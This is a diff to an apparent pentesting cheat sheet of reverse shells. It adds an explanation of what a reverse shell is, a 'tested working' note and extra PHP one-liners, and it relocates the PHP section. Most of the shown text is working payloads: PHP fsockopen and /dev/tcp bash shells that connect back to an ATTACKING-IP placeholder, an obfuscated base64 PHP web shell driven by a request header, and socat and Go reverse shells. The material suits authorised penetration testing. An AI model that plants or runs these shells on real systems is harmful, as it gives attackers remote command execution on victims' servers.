@@ -20,6 +20,15 @@ Below are a collection of Windows and Linux **reverse shells** that use commonly
 
 If you found this resource usefull you should also check out our [penetration testing tools](/blog/penetration-testing-tools-cheat-sheet/) cheat sheet which has some additional reverse shells and other commands useful when performing penetration testing. 
 
+## What is a Reverse Shell 
+
+A reverse shell is code placed on a target server that when executed attemts to "connect back" to your listening netcat on your attacking machine. A reverse shell is often also referred to as a revshell. 
+
+<div class='note'><h2>NOTE: Working Reverse Shells</h2>
+<p>The revshells on this page are tested working when they are added to the cheat sheet.</p> 
+</div>
+
+08/06/2024 - Added addition PHP reverse shell one liner + house keeping.
 25/02/2022 - House keeping
 17/09/2020 - Updated to add the reverse shells submitted via Twitter @JaneScott 
 29/03/2015 - Original post date
@@ -47,6 +56,45 @@ nc: listening on 0.0.0.0 80 ...
 </div>
 
 **ATTACKING-IP** is the machine running your listening netcat session, port 80 is used in all examples below (for reasons mentioned above).
+
+
+## PHP Reverse Shell
+
+The following section contains PHP reverse shells that have been tested working. 
+
+A useful PHP reverse shell:
+
+{% highlight bash %}
+php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
+{% endhighlight %}
+
+### PHP Reverse Shell One Liner
+
+A short one line reverse PHP shell (that was submitted via Twitter):
+
+{% highlight bash %}
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
+{% endhighlight %}
+
+### Short One Liner PHP Reverse Shell 
+
+Another short oneliner PHP Revshell: 
+
+{% highlight bash %}
+<?php
+exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'");
+{% endhighlight %}
+
+### Base64 PHP Shell
+
+Base64 encoded PHP Shell by @0xInfection: 
+
+```
+<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
+```
+
+Another excellent PHP shell that I have personally used MANY times is the Pentest Monkey reverse shell that can be downloaded from their GitHub here: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
 
 ## Bash Reverse Shells
 {% highlight bash %}
@@ -84,26 +132,6 @@ socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
 {% endhighlight %}
 
-## PHP Reverse Shell
-
-A useful PHP reverse shell:
-
-{% highlight bash %}
-php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
-(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
-{% endhighlight %}
-
-Another PHP reverse shell (that was submitted via Twitter):
-
-{% highlight bash %}
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
-{% endhighlight %}
-
-Base64 encoded by @0xInfection: 
-
-```
-<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
-```
 
 ## Netcat Reverse Shell
 
